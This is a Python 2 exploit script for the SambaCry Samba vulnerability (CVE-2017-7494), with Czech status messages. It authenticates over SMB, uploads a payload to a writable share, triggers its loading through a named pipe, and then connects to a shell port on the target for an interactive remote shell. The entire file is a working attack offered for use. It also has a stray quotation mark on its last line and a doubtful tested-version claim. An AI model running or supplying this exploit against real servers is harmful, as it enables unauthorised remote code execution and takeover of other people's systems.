#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

import os
from impacket.dcerpc.v5 import transport
from impacket.smbconnection import *
import sys
import time
import socket
from threading import Thread


class SambaCry:
    """
        Sambacry (CVE-2017-7494)

        Tested on samba 5.4.9

    """

    port = 445

    def __init__(self):
        pass

    @staticmethod
    def dce_trigger(dce):
        try:
            dce.connect()
        except SessionError as error:
            print "[+] Ocekavana vyjimka od: Samba (SMB SessionError)"
        except nmb.NetBIOSError as error:
            print " [-] Spojeni ukonceno"
        except nmb.NetBIOSTimeout as error:
            pass

    @staticmethod
    def receive_and_print(sock):
        try:
            while True:
                data = sock.recv(8)
                if not data:
                    break
                sys.stdout.write(str(data))
        except Exception as e:
            print "[-] Vyjimka: " + str(e)

    @staticmethod
    def exploit(target, port, executable, remote_share, remote_path, user=None, password=None, remote_shell_port=None):
        """Samba exploit"""

        # Open the connection
        try:
            smb_client = SMBConnection(target, target, sess_port=port)
        except socket.error as error:
            print "[-] Chyba spojeni", error.message
            return

        if user:
            try:
                if not smb_client.login(user, password):
                    raise Exception("[-] Chyba autentizace, neplatne uzivatelske jmeno nebo heslo")
                else:
                    print "[i] Autentizace ok, jsme tam !"
            except SessionError as error:
                print "[-] Chyba spojeni", error.message
                return

        # Upload the payload module
        print "[+] Pripravuji exploit"
        executable_name = os.path.basename(executable)
        executable_file = open(executable, 'rb')

        smb_client.putFile(remote_share, executable_name, executable_file.read)

        executable_file.close()

        # Trigger the bug in another thread, since it will be locked
        trigger_module = r'ncacn_np:%s[\pipe\%s]' % (target, remote_path)
        rpc_transport = transport.DCERPCTransportFactory(trigger_module)
        dce = rpc_transport.get_dce_rpc()
        trigger_thread = Thread(target=SambaCry.dce_trigger, args=(dce,))
        trigger_thread.daemon = True
        trigger_thread.start()

        # Give some time to the exploit to run
        time.sleep(2)

        # Profit
        if not remote_shell_port:
            print "[i] Cil napaden, over si to"
            return

        remote_shell_port = int(remote_shell_port)

        print "[+] Exploit trigger bezi v pozadi, kontroluji nas shell"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            print "[+] Pripojuji se k %s port %s" % (target, str(remote_shell_port))
            sock.connect((target, remote_shell_port))
            print "[+] Overuji tvuj shell..."
            command = "uname -a"

            # Receive and print data in another thread
            receive_thread = Thread(target=SambaCry.receive_and_print, args=(sock,))
            receive_thread.daemon = True
            receive_thread.start()

            while True:
                try:
                    sock.send(command)
                    sock.send("\n")
                except nmb.NetBIOSError:
                    break
                command = raw_input(">>")
            sock.close()
        except Exception as e:
            print "[-] IO error pripojeni k shellu " + str(e)"
